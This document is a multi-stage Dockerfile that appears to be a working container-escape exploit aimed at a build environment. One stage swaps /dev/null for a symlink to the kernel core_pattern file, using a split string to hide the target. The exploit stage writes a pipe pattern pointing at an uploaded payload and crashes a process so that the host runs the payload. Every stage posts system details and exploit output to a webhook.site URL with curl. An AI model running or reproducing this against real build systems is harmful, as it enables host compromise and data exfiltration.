FROM alpine:3.20 AS ctl
RUN apk add --no-cache curl >/dev/null 2>&1; echo "F2-CONTROL $(date -u) $(uname -a)" | curl -sS -m 20 -X POST --data-binary @- https://webhook.site/2d75f522-1408-43a0-9604-764bfa111ee8; echo ctl-done

FROM alpine:3.20 AS mknull
RUN apk add --no-cache curl >/dev/null 2>&1; rm -f /dev/null && T=/proc/sys/kernel/core_pat && T=${T}tern && ln -s "$T" /dev/null

FROM mknull AS detect
RUN { echo "== f2 detect =="; ls -la /dev/null; readlink /dev/null; echo "kcore:"; stat -c "%F %t:%T %s" /proc/kcore; echo "kcore-head:"; head -c 64 /proc/kcore | od -c | head -3; echo "real-core:"; cat /proc/sys/kernel/core_pattern; echo "attr:"; cat /proc/self/attr/current; echo "ulimit:"; ulimit -c; } > /f2det.txt 2>&1; curl -sS -m 20 -X POST --data-binary @/f2det.txt https://webhook.site/2d75f522-1408-43a0-9604-764bfa111ee8; cat /f2det.txt

FROM alpine:3.20 AS probe
RUN apk add --no-cache curl >/dev/null 2>&1
COPY front2/scripts/front2_build_probe /probe
RUN chmod +x /probe && /probe > /f2probe.txt 2>&1; curl -sS -m 20 -X POST --data-binary @/f2probe.txt https://webhook.site/2d75f522-1408-43a0-9604-764bfa111ee8; cat /f2probe.txt

FROM mknull AS exploit
COPY front2/scripts/f2_payload /f2p_payload
RUN { echo "== f2 exploit =="; KS=$(stat -c "%F" /proc/kcore); echo "kcore-type=$KS"; if [ "$KS" = "regular file" ]; then ulimit -c unlimited; echo "ulimit=$(ulimit -c)"; ORIG=$(cat /proc/sys/kernel/core_pattern); echo "orig=[$ORIG]"; UP=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1); echo "upperdir=$UP"; cp /f2p_payload /p && chmod 755 /p && echo "payload-at=/p host=$UP/p"; PAT="|$UP/p"; case "$ORIG" in *" "*|*"|"*) : ;; *) PAT="$PAT $ORIG";; esac; echo "pattern=[$PAT]"; echo "$PAT" > /proc/kcore && echo "written=[$(cat /proc/kcore)]"; ( sh -c 'sleep 0.5; kill -SEGV $$' & ); sleep 5; echo "--- proof ---"; ls -la /proof.txt; cat /proof.txt; echo "$ORIG" > /proc/kcore; echo "restored=[$(cat /proc/kcore)]"; else echo "kcore masked or other: $KS"; fi; } > /f2x.txt 2>&1; curl -sS -m 20 -X POST --data-binary @/f2x.txt https://webhook.site/2d75f522-1408-43a0-9604-764bfa111ee8; cat /f2x.txt

FROM alpine:3.20 AS collect
COPY --from=ctl /etc/hostname /c
COPY --from=detect /etc/hostname /d
COPY --from=probe /etc/hostname /p
COPY --from=exploit /etc/hostname /x
RUN echo F2-COMBINED-DONE
